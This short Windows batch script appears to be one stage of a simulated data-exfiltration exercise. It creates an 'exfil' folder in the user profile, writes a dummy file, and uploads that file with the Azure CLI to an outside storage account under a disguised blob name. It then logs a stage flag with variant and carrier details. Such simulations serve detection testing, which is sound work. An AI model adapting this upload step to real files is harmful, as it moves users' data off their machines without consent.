@echo off
set EXFIL_DIR=%USERPROFILE%\bops4048\exfil
if not exist "%EXFIL_DIR%" mkdir "%EXFIL_DIR%"
if not exist "%EXFIL_DIR%\part4.dat" echo dummy > "%EXFIL_DIR%\part4.dat"
call az storage blob upload --account-name nebuchadnezzar --container-name oracle --file "%EXFIL_DIR%\part4.dat" --name "morpheus-766232343d.bin"
ver >nul
> "%EXFIL_DIR%\stage-04.flag" (
  echo variant=04-direct-az-cli-piece-4
  echo carrier=morpheus-766232343d.bin
  echo writer=az.cmd
  echo timestamp=%DATE% %TIME%
)
exit /b 0
